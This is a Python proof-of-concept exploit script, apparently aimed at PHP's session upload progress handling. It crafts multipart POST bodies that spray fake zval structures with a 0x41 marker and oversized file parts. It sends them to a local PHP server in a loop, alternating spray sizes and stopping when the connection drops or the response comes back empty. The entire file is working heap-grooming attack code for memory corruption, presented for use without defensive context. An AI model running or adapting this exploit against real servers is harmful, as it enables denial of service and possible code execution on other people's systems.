#!/usr/bin/env python3
"""Rapid-fire php2shell reclaimer: blasts the armed child with fire requests
in a tight loop (one persistent process, fresh connection per request),
alternating spray shapes. Kills on connection-refused/empty response."""
import socket, struct, sys, time

URL_HOST, URL_PORT, URL_PATH = "127.0.0.1", 18120, "/index.php"
SID = "u0123456789abcdefghijklmnopqrstuv"
BND = b"UctxPoc2026"
SPRAY_LEN = 8208 - 24 - 1
MARKER = 0x4141414141414141

def zval_spray():
    z = struct.pack("<QII", MARKER, 8, 0)
    return (z * (SPRAY_LEN // 16))[:SPRAY_LEN]

SMALL = struct.pack("<QII", MARKER, 8, 0) + b"\x00" * 8

def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

def fire_body(n_spray, n_small=600):
    o = bytearray()
    o += part(b"PHPSESSID", SID.encode())
    o += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    z = zval_spray()
    for _ in range(n_spray):
        o += part(b"s[]", z)
    for _ in range(n_small):
        o += part(b"t[]", SMALL)
    o += part(b"f", b"A" * 6144, filename=b"a")
    o += part(b"g", b"B" * 6144, filename=b"b")
    o += b"--" + BND + b"--\r\n"
    return bytes(o)

def blast(body):
    try:
        s = socket.create_connection((URL_HOST, URL_PORT), timeout=15)
        s.sendall(
            f"POST {URL_PATH} HTTP/1.1\r\nHost: {URL_HOST}\r\n"
            f"Cookie: PHPSESSID={SID}\r\n"
            f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode() + body)
        s.settimeout(15)
        data = b""
        while True:
            try:
                c = s.recv(65536)
            except Exception as e:
                return f"RECV-{type(e).__name__}"
            if not c:
                break
            data += c
        s.close()
        if not data:
            return "EMPTY"
        return data.split(b" ", 2)[1].decode() if b"HTTP/" in data.split(b"\r\n", 1)[0] else "NOHTTP"
    except Exception as e:
        return f"CONN-{type(e).__name__}"

def main():
    shapes = [150, 250, 350, 450]
    bodies = {n: fire_body(n) for n in shapes}
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 60
    for i in range(n):
        res = blast(bodies[shapes[i % len(shapes)]])
        print(f"fire#{i} fs={shapes[i % len(shapes)]} -> {res}", flush=True)
        if res in ("EMPTY", "NOHTTP") or res.startswith(("CONN-", "RECV-")):
            print(f"==== KILL SIGNATURE at fire#{i}: {res} ====", flush=True)
            return
    print(f"{n} fires, no kill")

if __name__ == "__main__":
    main()
